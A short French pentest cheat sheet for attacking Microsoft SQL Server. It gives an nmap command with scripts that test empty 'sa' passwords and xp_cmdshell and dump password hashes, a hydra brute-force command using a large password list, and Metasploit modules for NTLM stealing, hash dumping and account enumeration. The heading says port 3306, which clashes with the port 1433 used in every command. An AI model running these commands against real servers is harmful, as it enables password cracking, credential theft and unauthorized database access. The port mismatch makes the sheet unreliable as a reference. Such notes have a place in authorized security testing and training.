Base de données SQL, port 3306, TCP
### Enumération                                                                                        

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
```

---
### Brute force

```bash
hydra -l monUser -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt $ip mssql
```

---
### Metasploit

```bash
auxiliary/admin/mssql/mssql_ntlm_stealer
admin/mssql/mssql_enum
admin/mssql/mssql_enum_domain_accounts
admin/mssql/mssql_enum_sql_logins
auxiliary/admin/mssql/mssql_findandsampledata
auxiliary/scanner/mssql/mssql_hashdump
auxiliary/scanner/mssql/mssql_schemadump

```


---
